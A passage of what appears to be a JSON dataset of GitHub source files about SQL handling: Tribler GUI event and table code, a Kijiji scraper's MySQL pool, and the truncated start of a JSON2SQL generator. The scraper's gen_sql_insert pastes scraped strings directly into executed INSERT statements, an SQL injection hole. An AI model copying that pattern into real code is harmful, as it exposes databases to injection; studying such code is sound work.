        "source": "from __future__ import absolute_import\n\nimport logging\nimport time\n\nfrom PyQt5.QtCore import QTimer, QUrl, pyqtSignal\nfrom PyQt5.QtNetwork import QNetworkAccessManager, QNetworkReply, QNetworkRequest\n\nimport Tribler.Core.Utilities.json_util as json\n\nreceived_events = []\n\n\nclass EventRequestManager(QNetworkAccessManager):\n    \"\"\"\n    The EventRequestManager class handles the events connection over which important events in Tribler are pushed.\n    \"\"\"\n\n    torrent_info_updated = pyqtSignal(object)\n    received_search_result_channel = pyqtSignal(object)\n    received_search_result_torrent = pyqtSignal(object)\n    tribler_started = pyqtSignal()\n    upgrader_tick = pyqtSignal(str)\n    upgrader_started = pyqtSignal()\n    upgrader_finished = pyqtSignal()\n    new_version_available = pyqtSignal(str)\n    discovered_channel = pyqtSignal(object)\n    discovered_torrent = pyqtSignal(object)\n    torrent_finished = pyqtSignal(object)\n    received_market_ask = pyqtSignal(object)\n    received_market_bid = pyqtSignal(object)\n    expired_market_ask = pyqtSignal(object)\n    expired_market_bid = pyqtSignal(object)\n    market_transaction_complete = pyqtSignal(object)\n    market_payment_received = pyqtSignal(object)\n    market_payment_sent = pyqtSignal(object)\n    market_iom_input_required = pyqtSignal(object)\n    events_started = pyqtSignal(object)\n    low_storage_signal = pyqtSignal(object)\n    credit_mining_signal = pyqtSignal(object)\n    tribler_shutdown_signal = pyqtSignal(str)\n\n    def __init__(self, api_port):\n        QNetworkAccessManager.__init__(self)\n        url = QUrl(\"http://localhost:%d/events\" % api_port)\n        self.request = QNetworkRequest(url)\n        self.failed_attempts = 0\n        self.connect_timer = QTimer()\n        self.current_event_string = \"\"\n        self.tribler_version = \"Unknown\"\n        self.reply = None\n        self.emitted_tribler_started = False  # We should only emit tribler_started once\n        self.shutting_down = False\n        self._logger = logging.getLogger('TriblerGUI')\n\n    def on_error(self, error, reschedule_on_err):\n        self._logger.info(\"Got Tribler core error: %s\" % error)\n        if error == QNetworkReply.ConnectionRefusedError:\n            if self.failed_attempts == 40:\n                raise RuntimeError(\"Could not connect with the Tribler Core within 20 seconds\")\n\n            self.failed_attempts += 1\n\n            if reschedule_on_err:\n                # Reschedule an attempt\n                self.connect_timer = QTimer()\n                self.connect_timer.setSingleShot(True)\n                self.connect_timer.timeout.connect(self.connect)\n                self.connect_timer.start(500)\n\n    def on_read_data(self):\n        if self.receivers(self.finished) == 0:\n            self.finished.connect(lambda reply: self.on_finished())\n        self.connect_timer.stop()\n        data = self.reply.readAll()\n        self.current_event_string += data\n        if len(self.current_event_string) > 0 and self.current_event_string[-1] == '\\n':\n            for event in self.current_event_string.split('\\n'):\n                if len(event) == 0:\n                    continue\n                json_dict = json.loads(str(event))\n\n                received_events.insert(0, (json_dict, time.time()))\n                if len(received_events) > 100:  # Only buffer the last 100 events\n                    received_events.pop()\n\n                if json_dict[\"type\"] == \"torrent_info_updated\":\n                    self.torrent_info_updated.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"tribler_started\" and not self.emitted_tribler_started:\n                    self.tribler_started.emit()\n                    self.emitted_tribler_started = True\n                elif json_dict[\"type\"] == \"new_version_available\":\n                    self.new_version_available.emit(json_dict[\"event\"][\"version\"])\n                elif json_dict[\"type\"] == \"upgrader_started\":\n                    self.upgrader_started.emit()\n                elif json_dict[\"type\"] == \"upgrader_finished\":\n                    self.upgrader_finished.emit()\n                elif json_dict[\"type\"] == \"upgrader_tick\":\n                    self.upgrader_tick.emit(json_dict[\"event\"][\"text\"])\n                elif json_dict[\"type\"] == \"channel_discovered\":\n                    self.discovered_channel.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"torrent_discovered\":\n                    self.discovered_torrent.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"events_start\":\n                    self.events_started.emit(json_dict[\"event\"])\n                    self.tribler_version = json_dict[\"event\"][\"version\"]\n                    if json_dict[\"event\"][\"tribler_started\"] and not self.emitted_tribler_started:\n                        self.tribler_started.emit()\n                        self.emitted_tribler_started = True\n                elif json_dict[\"type\"] == \"torrent_finished\":\n                    self.torrent_finished.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"market_ask\":\n                    self.received_market_ask.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"market_bid\":\n                    self.received_market_bid.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"market_ask_timeout\":\n                    self.expired_market_ask.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"market_bid_timeout\":\n                    self.expired_market_bid.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"market_transaction_complete\":\n                    self.market_transaction_complete.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"market_payment_received\":\n                    self.market_payment_received.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"market_payment_sent\":\n                    self.market_payment_sent.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"market_iom_input_required\":\n                    self.market_iom_input_required.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"signal_low_space\":\n                    self.low_storage_signal.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"credit_mining_error\":\n                    self.credit_mining_signal.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"shutdown\":\n                    self.tribler_shutdown_signal.emit(json_dict[\"event\"])\n                elif json_dict[\"type\"] == \"tribler_exception\":\n                    raise RuntimeError(json_dict[\"event\"][\"text\"])\n            self.current_event_string = \"\"\n\n    def on_finished(self):\n        \"\"\"\n        Somehow, the events connection dropped. Try to reconnect.\n        \"\"\"\n        if self.shutting_down:\n            return\n        self._logger.warning(\"Events connection dropped, attempting to reconnect\")\n        self.failed_attempts = 0\n\n        self.connect_timer = QTimer()\n        self.connect_timer.setSingleShot(True)\n        self.connect_timer.timeout.connect(self.connect)\n        self.connect_timer.start(500)\n\n    def connect(self, reschedule_on_err=True):\n        self._logger.info(\"Will connect to events endpoint\")\n        self.reply = self.get(self.request)\n\n        self.reply.readyRead.connect(self.on_read_data)\n        self.reply.error.connect(lambda error: self.on_error(error, reschedule_on_err=reschedule_on_err))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/TriblerGUI/widgets/tablecontentmodel.py",
        "source": "from __future__ import absolute_import, division\n\nfrom abc import abstractmethod\n\nfrom PyQt5.QtCore import QAbstractTableModel, QModelIndex, Qt, pyqtSignal\n\nfrom TriblerGUI.defs import ACTION_BUTTONS\nfrom TriblerGUI.utilities import format_size, pretty_date\n\n\nclass RemoteTableModel(QAbstractTableModel):\n    \"\"\"\n    The base model for the tables in the Tribler GUI.\n    It is specifically designed to fetch data from a remote data source, i.e. over a RESTful API.\n    \"\"\"\n    on_sort = pyqtSignal(str, bool)\n\n    def __init__(self, parent=None):\n        super(RemoteTableModel, self).__init__(parent)\n        self.data_items = []\n        self.item_load_batch = 50\n        self.total_items = 0  # The total number of items without pagination\n        self.infohashes = {}\n\n    @abstractmethod\n    def _get_remote_data(self, start, end, **kwargs):\n        # This must call self._on_new_items_received as a callback when data received\n        pass\n\n    @abstractmethod\n    def _set_remote_data(self):\n        pass\n\n    def reset(self):\n        self.beginResetModel()\n        self.data_items = []\n        self.endResetModel()\n\n    def sort(self, column, order):\n        self.reset()\n        self.on_sort.emit(self.columns[column], bool(order))\n\n    def add_items(self, new_data_items):\n        if not new_data_items:\n            return\n        # If we want to block the signal like itemChanged, we must use QSignalBlocker object\n        old_end = self.rowCount()\n        new_end = self.rowCount() + len(new_data_items)\n        self.beginInsertRows(QModelIndex(), old_end, new_end - 1)\n        self.data_items.extend(new_data_items)\n        self.endInsertRows()\n\n\nclass TriblerContentModel(RemoteTableModel):\n    column_headers = []\n    column_width = {}\n    column_flags = {}\n    column_display_filters = {}\n\n    def __init__(self, hide_xxx=False):\n        RemoteTableModel.__init__(self, parent=None)\n        self.data_items = []\n        self.column_position = {name: i for i, name in enumerate(self.columns)}\n        self.edit_enabled = False\n        self.hide_xxx = hide_xxx\n\n    def headerData(self, num, orientation, role=None):\n        if orientation == Qt.Horizontal and role == Qt.DisplayRole:\n            return self.column_headers[num]\n\n    def _get_remote_data(self, start, end, **kwargs):\n        pass\n\n    def _set_remote_data(self):\n        pass\n\n    def rowCount(self, parent=QModelIndex()):\n        return len(self.data_items)\n\n    def columnCount(self, parent=QModelIndex()):\n        return len(self.columns)\n\n    def flags(self, index):\n        return self.column_flags[self.columns[index.column()]]\n\n    def data(self, index, role):\n        if role == Qt.DisplayRole:\n            column = self.columns[index.column()]\n            data = self.data_items[index.row()][column] if column in self.data_items[index.row()] else u'UNDEFINED'\n            return self.column_display_filters.get(column, str(data))(data) \\\n                if column in self.column_display_filters else data\n\n    def add_items(self, new_data_items):\n        super(TriblerContentModel, self).add_items(new_data_items)\n        # Build reverse mapping from infohashes to rows\n        items_len = len(self.data_items)\n        new_items_len = len(new_data_items)\n        for i, item in enumerate(new_data_items):\n            if \"infohash\" in item:\n                self.infohashes[item[\"infohash\"]] = items_len - new_items_len + i\n\n    def reset(self):\n        self.infohashes.clear()\n        super(TriblerContentModel, self).reset()\n\n    def update_torrent_info(self, update_dict):\n        row = self.infohashes.get(update_dict[\"infohash\"])\n        if row:\n            self.data_items[row].update(**update_dict)\n            self.dataChanged.emit(self.index(row, 0), self.index(row, len(self.columns)), [])\n\n\nclass SearchResultsContentModel(TriblerContentModel):\n    \"\"\"\n    Model for a list that shows search results.\n    \"\"\"\n    columns = [u'category', u'name', u'health', ACTION_BUTTONS]\n    column_headers = [u'Category', u'Name', u'health', u'']\n    column_flags = {\n        u'category': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        u'name': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        u'health': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        ACTION_BUTTONS: Qt.ItemIsEnabled | Qt.ItemIsSelectable\n    }\n\n    def __init__(self, **kwargs):\n        TriblerContentModel.__init__(self, **kwargs)\n        self.type_filter = None\n\n\nclass ChannelsContentModel(TriblerContentModel):\n    \"\"\"\n    This model represents a list of channels that can be displayed in a table view.\n    \"\"\"\n    columns = [u'name', u'torrents', u'updated', u'subscribed']\n    column_headers = [u'Channel name', u'Torrents', u'Updated', u'']\n    column_flags = {\n        u'name': Qt.ItemIsEnabled,\n        u'torrents': Qt.ItemIsEnabled,\n        u'updated': Qt.ItemIsEnabled,\n        u'subscribed': Qt.ItemIsEnabled,\n        ACTION_BUTTONS: Qt.ItemIsEnabled\n    }\n    column_display_filters = {\n        u'updated': lambda date: pretty_date(date // 1000),\n    }\n\n    def __init__(self, subscribed=False, **kwargs):\n        TriblerContentModel.__init__(self, **kwargs)\n        self.subscribed = subscribed\n\n\nclass TorrentsContentModel(TriblerContentModel):\n    columns = [u'category', u'name', u'size', u'health', ACTION_BUTTONS]\n    column_headers = [u'Category', u'Name', u'Size', u'Health', u'']\n    column_flags = {\n        u'category': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        u'name': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        u'size': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        u'health': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        ACTION_BUTTONS: Qt.ItemIsEnabled | Qt.ItemIsSelectable\n    }\n\n    column_display_filters = {\n        u'size': lambda data: format_size(float(data)),\n    }\n\n    def __init__(self, channel_pk='', **kwargs):\n        TriblerContentModel.__init__(self, **kwargs)\n        self.channel_pk = channel_pk\n\n\nclass MyTorrentsContentModel(TorrentsContentModel):\n    columns = [u'category', u'name', u'size', u'status', ACTION_BUTTONS]\n    column_headers = [u'Category', u'Name', u'Size', u'', u'']\n    column_flags = {\n        u'category': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        u'name': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        u'size': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        u'status': Qt.ItemIsEnabled | Qt.ItemIsSelectable,\n        ACTION_BUTTONS: Qt.ItemIsEnabled | Qt.ItemIsSelectable\n    }\n\n    def __init__(self, channel_pk='', **kwargs):\n        TorrentsContentModel.__init__(self, channel_pk=channel_pk, **kwargs)\n        self.exclude_deleted = False\n        self.edit_enabled = True\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Tribler/tribler/blob/f731693201bbb1e74e2c0ef22a93567d81f171c1",
        "file_path": "/TriblerGUI/widgets/triblertablecontrollers.py",
        "source": "\"\"\"\nThis file contains various controllers for table views.\nThe responsibility of the controller is to populate the table view with some data, contained in a specific model.\n\"\"\"\nfrom __future__ import absolute_import\n\nfrom six import text_type\n\nfrom TriblerGUI.tribler_request_manager import TriblerRequestManager\n\n\ndef sanitize_for_fts(text):\n    return text_type(text).translate({ord(u\"\\\"\"): u\"\\\"\\\"\", ord(u\"\\'\"): u\"\\'\\'\"})\n\n\ndef to_fts_query(text):\n    if not text:\n        return \"\"\n    words = text.split(\" \")\n\n    # TODO: add support for quoted exact searches\n    query_list = [u'\\\"' + sanitize_for_fts(word) + u'\\\"*' for word in words]\n\n    return \" AND \".join(query_list)\n\n\nclass TriblerTableViewController(object):\n    \"\"\"\n    Base controller for a table view that displays some data.\n    \"\"\"\n\n    def __init__(self, model, table_view):\n        self.model = model\n        self.model.on_sort.connect(self._on_view_sort)\n        self.table_view = table_view\n        self.table_view.setModel(self.model)\n        self.table_view.verticalScrollBar().valueChanged.connect(self._on_list_scroll)\n        self.request_mgr = None\n\n    def _on_list_scroll(self, event):\n        pass\n\n    def _on_view_sort(self, column, ascending):\n        pass\n\n    def _get_sort_parameters(self):\n        \"\"\"\n        Return a tuple (column_name, sort_asc) that indicates the sorting column/order of the table view.\n        \"\"\"\n        sort_by = self.model.columns[self.table_view.horizontalHeader().sortIndicatorSection()]\n        sort_asc = self.table_view.horizontalHeader().sortIndicatorOrder()\n        return sort_by, sort_asc\n\n\nclass SearchResultsTableViewController(TriblerTableViewController):\n    \"\"\"\n    Controller for the table view that handles search results.\n    \"\"\"\n\n    def __init__(self, model, table_view, details_container, num_search_results_label=None):\n        TriblerTableViewController.__init__(self, model, table_view)\n        self.num_search_results_label = num_search_results_label\n        self.details_container = details_container\n        self.query = None\n        table_view.selectionModel().selectionChanged.connect(self._on_selection_changed)\n\n    def _on_selection_changed(self, _):\n        selected_indices = self.table_view.selectedIndexes()\n        if not selected_indices:\n            return\n\n        torrent_info = selected_indices[0].model().data_items[selected_indices[0].row()]\n        if torrent_info['type'] == 'channel':\n            self.details_container.hide()\n            self.table_view.clearSelection()\n            return\n\n        self.details_container.show()\n        self.details_container.details_tab_widget.update_with_torrent(selected_indices[0], torrent_info)\n\n    def _on_view_sort(self, column, ascending):\n        self.model.reset()\n        self.load_search_results(self.query, 1, 50)\n\n    def _on_list_scroll(self, event):\n        if self.table_view.verticalScrollBar().value() == self.table_view.verticalScrollBar().maximum() and \\\n                self.model.data_items:  # workaround for duplicate calls to _on_list_scroll on view creation\n            self.load_search_results(self.query)\n\n    def load_search_results(self, query, start=None, end=None):\n        \"\"\"\n        Fetch search results for a given query.\n        \"\"\"\n        self.query = query\n\n        if not start or not end:\n            start, end = self.model.rowCount() + 1, self.model.rowCount() + self.model.item_load_batch\n\n        sort_by, sort_asc = self._get_sort_parameters()\n        url_params = {\n            \"filter\": to_fts_query(query),\n            \"first\": start if start else '',\n            \"last\": end if end else '',\n            \"sort_by\": sort_by if sort_by else '',\n            \"sort_asc\": sort_asc,\n            \"hide_xxx\": self.model.hide_xxx,\n            \"metadata_type\": self.model.type_filter if self.model.type_filter else ''\n        }\n        self.request_mgr = TriblerRequestManager()\n        self.request_mgr.perform_request(\"search\", self.on_search_results, url_params=url_params)\n\n    def on_search_results(self, response):\n        if not response:\n            return\n\n        self.model.total_items = response['total']\n\n        if self.num_search_results_label:\n            self.num_search_results_label.setText(\"%d results\" % response['total'])\n\n        if response['first'] >= self.model.rowCount():\n            self.model.add_items(response['results'])\n\n\nclass ChannelsTableViewController(TriblerTableViewController):\n    \"\"\"\n    This class manages a list with channels.\n    \"\"\"\n\n    def __init__(self, model, table_view, num_channels_label=None, filter_input=None):\n        TriblerTableViewController.__init__(self, model, table_view)\n        self.num_channels_label = num_channels_label\n        self.filter_input = filter_input\n\n        if self.filter_input:\n            self.filter_input.textChanged.connect(self._on_filter_input_change)\n\n    def _on_filter_input_change(self, _):\n        self.model.reset()\n        self.load_channels(1, 50)\n\n    def _on_view_sort(self, column, ascending):\n        self.model.reset()\n        self.load_channels(1, 50)\n\n    def _on_list_scroll(self, event):\n        if self.table_view.verticalScrollBar().value() == self.table_view.verticalScrollBar().maximum() and \\\n                self.model.data_items:  # workaround for duplicate calls to _on_list_scroll on view creation\n            self.load_channels()\n\n    def load_channels(self, start=None, end=None):\n        \"\"\"\n        Fetch various channels.\n        \"\"\"\n        if not start and not end:\n            start, end = self.model.rowCount() + 1, self.model.rowCount() + self.model.item_load_batch\n\n        if self.filter_input and self.filter_input.text().lower():\n            filter_text = self.filter_input.text().lower()\n        else:\n            filter_text = ''\n\n        sort_by, sort_asc = self._get_sort_parameters()\n\n        self.request_mgr = TriblerRequestManager()\n        self.request_mgr.perform_request(\n            \"metadata/channels\",\n            self.on_channels,\n            url_params={\n                \"first\": start,\n                \"last\": end,\n                \"sort_by\": sort_by,\n                \"sort_asc\": sort_asc,\n                \"filter\": to_fts_query(filter_text),\n                \"hide_xxx\": self.model.hide_xxx,\n                \"subscribed\": self.model.subscribed})\n\n    def on_channels(self, response):\n        if not response:\n            return\n\n        self.model.total_items = response['total']\n\n        if self.num_channels_label:\n            self.num_channels_label.setText(\"%d items\" % response['total'])\n\n        if response['first'] >= self.model.rowCount():\n            self.model.add_items(response['channels'])\n\n\nclass TorrentsTableViewController(TriblerTableViewController):\n    \"\"\"\n    This class manages a list with torrents.\n    \"\"\"\n\n    def __init__(self, model, torrents_container, num_torrents_label=None, filter_input=None):\n        TriblerTableViewController.__init__(self, model, torrents_container.content_table)\n        self.torrents_container = torrents_container\n        self.num_torrents_label = num_torrents_label\n        self.filter_input = filter_input\n        torrents_container.content_table.selectionModel().selectionChanged.connect(self._on_selection_changed)\n\n        if self.filter_input:\n            self.filter_input.textChanged.connect(self._on_filter_input_change)\n\n    def _on_selection_changed(self, _):\n        selected_indices = self.table_view.selectedIndexes()\n        if not selected_indices:\n            return\n\n        self.torrents_container.details_container.show()\n        torrent_info = selected_indices[0].model().data_items[selected_indices[0].row()]\n        self.torrents_container.details_tab_widget.update_with_torrent(selected_indices[0], torrent_info)\n\n    def _on_filter_input_change(self, _):\n        self.model.reset()\n        self.load_torrents(1, 50)\n\n    def _on_view_sort(self, column, ascending):\n        self.model.reset()\n        self.load_torrents(1, 50)\n\n    def _on_list_scroll(self, event):\n        if self.table_view.verticalScrollBar().value() == self.table_view.verticalScrollBar().maximum() and \\\n                self.model.data_items:  # workaround for duplicate calls to _on_list_scroll on view creation\n            self.load_torrents()\n\n    def load_torrents(self, start=None, end=None):\n        \"\"\"\n        Fetch various torrents.\n        \"\"\"\n        if not start and not end:\n            start, end = self.model.rowCount() + 1, self.model.rowCount() + self.model.item_load_batch\n\n        if self.filter_input and self.filter_input.text().lower():\n            filter_text = self.filter_input.text().lower()\n        else:\n            filter_text = ''\n\n        sort_by, sort_asc = self._get_sort_parameters()\n\n        self.request_mgr = TriblerRequestManager()\n        self.request_mgr.perform_request(\n            \"metadata/channels/%s/torrents\" % self.model.channel_pk,\n            self.on_torrents,\n            url_params={\n                \"first\": start,\n                \"last\": end,\n                \"sort_by\": sort_by,\n                \"sort_asc\": sort_asc,\n                \"hide_xxx\": self.model.hide_xxx,\n                \"filter\": to_fts_query(filter_text)})\n\n    def on_torrents(self, response):\n        if not response:\n            return None\n\n        self.model.total_items = response['total']\n\n        if self.num_torrents_label:\n            self.num_torrents_label.setText(\"%d items\" % response['total'])\n\n        if response['first'] >= self.model.rowCount():\n            self.model.add_items(response['torrents'])\n        return True\n\n\nclass MyTorrentsTableViewController(TorrentsTableViewController):\n    \"\"\"\n    This class manages the list with the torrents in your own channel.\n    \"\"\"\n\n    def load_torrents(self, start=None, end=None):\n        \"\"\"\n        Fetch various torrents.\n        \"\"\"\n        if not start and not end:\n            start, end = self.model.rowCount() + 1, self.model.rowCount() + self.model.item_load_batch\n\n        if self.filter_input and self.filter_input.text().lower():\n            filter_text = self.filter_input.text().lower()\n        else:\n            filter_text = ''\n\n        sort_by, sort_asc = self._get_sort_parameters()\n\n        self.request_mgr = TriblerRequestManager()\n        self.request_mgr.perform_request(\n            \"mychannel/torrents\",\n            self.on_torrents,\n            url_params={\n                \"sort_by\": sort_by,\n                \"sort_asc\": sort_asc,\n                \"filter\": to_fts_query(filter_text),\n                \"exclude_deleted\": self.model.exclude_deleted})\n\n    def on_torrents(self, response):\n        if super(MyTorrentsTableViewController, self).on_torrents(response):\n            self.table_view.window().edit_channel_page.channel_dirty = response['dirty']\n            self.table_view.window().edit_channel_page.update_channel_commit_views()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/timweri/kijiji-housing-scraper/blob/5e58252fddf18e51ab03227b8c2c780f8f6cbc19",
        "file_path": "/database/mysql.py",
        "source": "#!/usr/bin/python3\n\nimport logging\nfrom datetime import datetime\nfrom queue import Queue\n\nimport MySQLdb\n\nfrom htmlscraper.listing import Listing\n\nlogger = logging.getLogger(__name__)\n\nclass MySQLConnectionPool:\n    FIELDS_DICT = {'id': 'id', 'title': 'title', 'pubdate': 'publish_date',\n                   'loc_id': 'location_id', 'addr': 'address', 'bedrooms': 'bedroom_qty',\n                   'bathrooms': 'bathroom_qty', 'price': 'price', 'pet_friendly': 'pet_friendly_flag',\n                   'furnished': 'furnished_flag', 'urgent': 'urgent_flag',\n                   'url': 'url', 'size': 'size', 'desc': 'description'}\n\n    def __init__(self, hostaddr, usr, pwd, dbname, size):\n        logger.info('Initializing an instance of MySQLConnectionPool')\n        logger.debug('Type checking for host address, username, password, database name and pool size')\n        if type(hostaddr) != str:\n            raise TypeError('hostaddr has to be a str')\n        if type(usr) != str:\n            raise TypeError('usr has to be a str')\n        if type(pwd) != str:\n            raise TypeError('pwd has to be a str')\n        if type(dbname) != str:\n            raise TypeError('dbname has to be a str')\n        logger.debug('All type checks passed')\n\n        logger.info('Initializing class variables')\n        # save MySQL server authentication\n        self._hostaddr = hostaddr\n        self._usr = usr\n        self._pwd = pwd\n        self._dbname = dbname\n\n        logger.info('Initializing MySQL connection pool')\n        # initiate an empty Queue of required size\n        self._pool = Queue(size)\n\n        # fill the pool up\n        for i in range(size):\n            self._pool.put(MySQLdb.connect(hostaddr, usr, pwd, dbname), block=False)\n        logger.info('Initialized MySQL connection pool')\n\n    # return an available connection from the pool\n    def get_connection(self):\n        logger.debug('Retrieving connection from the pool')\n        db = self._pool.get()\n\n        logger.debug('Type checking connection')\n        if not isinstance(db, MySQLdb.connections.Connection):\n            raise TypeError('A connection has to be of type MySQLdb.connections.Connection')\n            return -1\n\n        logger.info('Successful MySQL connection get request')\n        return db\n\n    # queue a connection to the pool\n    def put_connection(self, connection):\n        logger.debug('Type checking connection')\n        if not isinstance(connection, MySQLdb.connections.Connection):\n            raise TypeError('A connection has to be of type MySQLdb.connections.Connection')\n            return -1\n\n        self._pool.put_nowait(connection)\n        self._pool.task_done()\n        logger.info('Successful MySQL connection put request')\n        return 0\n\n    # close all connections\n    def clear_pool(self):\n        logger.info('Closing the MySQL connection pool (id {})'.format(id(self)))\n        while not self._pool.empty():\n            db = self._pool.get()\n            if not isinstance(db, MySQLdb.connections.Connection):\n                raise TypeError('A non-Connection object found in the connection pool')\n            db.close()\n            self._pool.task_done()\n        logger.info('Closed all connections in the MySQL connection pool (id {})'.format(id(self)))\n        return 0\n\n    # generate sql from a listing\n    def gen_sql_insert(self, listing, cat_id):\n        logger.debug('Generating MySQL command for insertion/update for table c{:d}'.format(cat_id))\n        if listing.id < 0:\n            logger.error('TypeError: id must be non-negative')\n            logger.error('Skipping the Listing')\n            return -1\n        if type(listing.pubdate) != datetime:\n            logger.error('TypeError: pubdate must be a datetime')\n            return -1\n\n        sql_cols = \"\"\"INSERT INTO c{cat_id:d}({id:s}, {url:s}, {loc_id:s}, {title:s}, {pubdate:s}, {desc:s}\"\"\".format(\n            cat_id=cat_id,\n            **self.FIELDS_DICT)\n        sql_vals = \"\"\") VALUES ({id:d}, '{url:s}', {loc_id:d}, '{title:s}', '{pubdate:s}', '{desc:s}'\"\"\".format(\n            id=listing.id,\n            url=listing.url,\n            loc_id=listing.loc_id,\n            title=listing.title,\n            pubdate=listing.pubdate.strftime(\n                '%Y-%m-%d %H:%M:%S'),\n            desc=listing.description)\n\n        col_list = [self.FIELDS_DICT['addr'], self.FIELDS_DICT['price'], self.FIELDS_DICT['bedrooms'],\n                    self.FIELDS_DICT['bathrooms'], self.FIELDS_DICT['pet_friendly'], self.FIELDS_DICT['furnished'],\n                    self.FIELDS_DICT['urgent'], self.FIELDS_DICT['size']]\n        val_list = [listing.addr, listing.price, listing.bedrooms, listing.bathrooms, listing.pet_friendlly,\n                    listing.furnished, listing.urgent, listing.size]\n        sql_list = [lambda: \"'{:s}'\".format(listing.addr), lambda: \"{:f}\".format(listing.price),\n                    lambda: \"{:f}\".format(listing.bedrooms),\n                    lambda: \"{:f}\".format(listing.bathrooms), lambda: \"{:d}\".format(int(listing.pet_friendlly)),\n                    lambda: \"{:d}\".format(int(listing.furnished)), lambda: \"{:d}\".format(int(listing.urgent)),\n                    lambda: \"{:f}\".format(listing.size)]\n        for i in range(len(col_list)):\n            if val_list[i] != -1:\n                sql_cols += \", \" + col_list[i]\n                sql_vals += \", \" + sql_list[i]()\n\n        output = sql_cols + sql_vals + ')'\n        logger.debug('MySQL command generation successful')\n        return output\n\n    # add a list of listings into an existing table\n    def update_table(self, listings, cat_id):\n        logger.info('Updating table c{} in the MySQL database'.format(cat_id))\n        logger.info('Requesting for MySQL connection')\n\n        db = self.get_connection()\n        cursor = db.cursor()\n\n        for l in listings:\n            if not isinstance(l, Listing):\n                logger.error('TypeError: Expected a Listing instance')\n                logger.error('Skipping this listing')\n                continue\n\n            logger.debug('Generating SQL command')\n\n            sql = self.gen_sql_insert(l, cat_id)\n            if sql == -1:\n                # Failed to generate SQL command\n                logger.error('Skipping the listing')\n                continue\n\n            try:\n                logger.debug('Executing SQL command')\n                cursor.execute(sql)\n                logger.debug('Committing changes to the database')\n                db.commit()\n                logger.info('Successfully added a listing to table c{:d}'.format(cat_id))\n            except:\n                db.rollback()\n                logger.error('Failed to add a listing to table c{:d}'.format(cat_id))\n                logger.error('Rolled back the database changes')\n        return 0\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/icanbwell/JSON2SQL/blob/39b58431119988712d62c8ee69680ba27fded50b",
        "file_path": "/json2sql/engine.py",
        "source": "import datetime\nimport json\nimport logging\nimport re\n\nimport MySQLdb\n\nfrom collections import namedtuple, defaultdict\n\nlogger = logging.getLogger(u'JSON2SQLGenerator')\n\n\nclass JSON2SQLGenerator(object):\n    \"\"\"\n    To Generate SQL query from JSON data\n    \"\"\"\n\n    # Constants to map JSON keys\n    WHERE_CONDITION = 'where'\n    AND_CONDITION = 'and'\n    OR_CONDITION = 'or'\n    NOT_CONDITION = 'not'\n    EXISTS_CONDITION = 'exists'\n    CUSTOM_METHOD_CONDITION = 'custom_method'\n\n    # Supported data types by plugin\n    INTEGER = 'integer'\n    STRING = 'string'\n    DATE = 'date'\n    DATE_TIME = 'datetime'\n    BOOLEAN = 'boolean'\n    NULLBOOLEAN = 'nullboolean'\n    CHOICE = 'choice'\n    MULTICHOICE = 'multichoice'\n\n    CONVERSION_REQUIRED = [\n        STRING, DATE, DATE_TIME\n    ]\n\n    # Maintain a set of binary operators\n    BETWEEN = 'between'\n    BINARY_OPERATORS = (BETWEEN, )\n\n    # MySQL aggregate functions\n    ALLOWED_AGGREGATE_FUNCTIONS = {'MIN', 'MAX'}\n\n    # Custom methods field types\n    ALLOWED_CUSTOM_METHOD_PARAM_TYPES = {'field', 'integer', 'string'}\n\n    # Is operator values\n    IS_OPERATOR_VALUE = {'NULL', 'NOT NULL', 'TRUE', 'FALSE'}\n\n    # Supported operators\n    VALUE_OPERATORS = namedtuple('VALUE_OPRATORS', [\n        'equals', 'greater_than', 'less_than',\n        'greater_than_equals', 'less_than_equals',\n        'not_equals', 'is_op', 'in_op', 'like', 'between',\n        'is_challenge_completed', 'is_challenge_not_completed'\n    ])(\n        equals='=',\n        greater_than='>',\n        less_than='<',\n        greater_than_equals='>=',\n        less_than_equals='<=',\n        not_equals='<>',\n        is_op='IS',\n        in_op='IN',\n        like='LIKE',\n        is_challenge_completed='is_challenge_completed',\n        is_challenge_not_completed='is_challenge_not_completed',\n        between=BETWEEN\n    )\n\n    DATA_TYPES = namedtuple('DATA_TYPES', [\n        'integer', 'string', 'date', 'date_time', 'boolean', 'nullboolean',\n        'choice', 'multichoice'\n    ])(\n        integer=INTEGER,\n        string=STRING,\n        date=DATE,\n        date_time=DATE_TIME,\n        boolean=BOOLEAN,\n        nullboolean=NULLBOOLEAN,\n        choice=CHOICE,\n        multichoice=MULTICHOICE\n    )\n\n    # Constants\n    FIELD_NAME = 'field_name'\n    TABLE_NAME = 'table_name'\n    DATA_TYPE = 'data_type'\n\n    JOIN_TABLE = 'join_table'\n    JOIN_COLUMN = 'join_column'\n    PARENT_TABLE = 'parent_table'\n    PARENT_COLUMN = 'parent_column'\n\n    CHALLENGE_CHECK_QUERY = 'EXISTS (SELECT 1 FROM journeys_memberstagechallenge WHERE challenge_id = {value} AND ' \\\n                            'completed_date IS NOT 